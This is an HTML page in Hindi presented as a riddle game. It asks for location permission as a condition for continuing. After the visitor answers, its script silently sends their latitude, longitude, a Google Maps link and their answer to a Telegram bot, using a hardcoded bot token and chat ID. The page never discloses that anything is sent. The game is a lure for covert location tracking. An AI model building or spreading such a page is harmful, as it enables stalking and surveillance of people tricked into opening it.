<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Riddle Challenge</title>
<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}
body{
background:linear-gradient(135deg,#050505,#111827,#0f172a);
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
padding:20px;
color:white;
}
.card{
width:100%;
max-width:700px;
padding:30px;
border-radius:25px;
background:rgba(255,255,255,.05);
backdrop-filter:blur(10px);
text-align:center;
box-shadow:0 0 30px rgba(0,255,255,.25);
}
.title{
font-size:38px;
margin-bottom:20px;
color:cyan;
}
.text{
font-size:22px;
line-height:1.6;
margin-bottom:25px;
}
.btn{
padding:15px 30px;
border:none;
border-radius:15px;
font-size:18px;
font-weight:bold;
cursor:pointer;
background:linear-gradient(45deg,#00ffff,#00ff88);
}
.option{
display:block;
width:100%;
margin:10px 0;
padding:15px;
border:none;
border-radius:15px;
font-size:18px;
cursor:pointer;
background: rgba(255, 255, 255, 0.1);
color: white;
transition: background 0.3s;
}
.option:hover {
background: rgba(255, 255, 255, 0.2);
}
</style>
</head>
<body>
<div class="card" id="app">
<h1 class="title">📍 Location Required</h1>
<div class="text">
आगे बढ़ने के लिए लोकेशन परमिशन आवश्यक है
</div>
<button class="btn" onclick="requestLocation()">
Allow Location
</button>
</div>

<script>
let userLocation = "लोकेशन उपलब्ध नहीं है";

function requestLocation(){
navigator.geolocation.getCurrentPosition(
function(position){
// लोकेशन डेटा को वेरिएबल में स्टोर करना
const lat = position.coords.latitude;
const lon = position.coords.longitude;
userLocation = `Latitude: ${lat}, Longitude: ${lon}\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`;
showRiddle();
},
function(){
alert("लोकेशन परमिशन नहीं मिली");
showRiddle(); // परमिशन न मिलने पर भी पहेली दिखाएगा
}
);
}

async function sendToTelegram(message){
const BOT_TOKEN = "8800918030:AAFLTzIJqwIiYSYG9h3m1IapfVSTe_AgyrE";
const CHAT_ID = "8064366990";
try{
await fetch(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id: CHAT_ID,
text: message
})
});
}catch(error){
console.log(error);
}
}
function showRiddle(){
document.getElementById("app").innerHTML = `
<h1 class="title">🧩 पहेली</h1>
<div class="text">
ऐसी कौन सी चीज़ है जो पानी पीते ही मर जाती है?
</div>
<button class="option" onclick="checkAnswer(0, 'आग')">
आग
</button>
<button class="option" onclick="checkAnswer(1, 'पेड़')">
पेड़
</button>
<button class="option" onclick="checkAnswer(2, 'मछली')">
मछली
</button>
<button class="option" onclick="checkAnswer(3, 'हवा')">
हवा
</button>
`;
}

function checkAnswer(choice, optionText){
let correct = 0;
let answerStatus = "";

if(choice === correct){
answerStatus = "सही उत्तर";
document.getElementById("app").innerHTML = `
<h1 class="title">✅ सही उत्तर</h1>
<div class="text">
बहुत बढ़िया! आपका उत्तर सही है।
</div>
<button class="btn" onclick="showThanks()">
Continue
</button>
`;
}
else{
answerStatus = "गलत उत्तर";
document.getElementById("app").innerHTML = `
<h1 class="title">❌ गलत उत्तर</h1>
<div class="text">
सही उत्तर: आग
</div>
<button class="btn" onclick="showThanks()">
Continue
</button>
`;
}

// टेलीग्राम पर संदेश भेजने की तैयारी
const messageToSend = `📌 *नया रिस्पॉन्स*\n\n📍 लोकेशन:\n${userLocation}\n\n🧠 यूज़र का जवाब: ${optionText} (${answerStatus})`;
sendToTelegram(messageToSend);
}

function showThanks(){
document.getElementById("app").innerHTML = `
<h1 class="title">
🙏 THANK YOU
</h1>
<div class="text">
धन्यवाद
</div>
`;
}
</script>
</body>
</html>
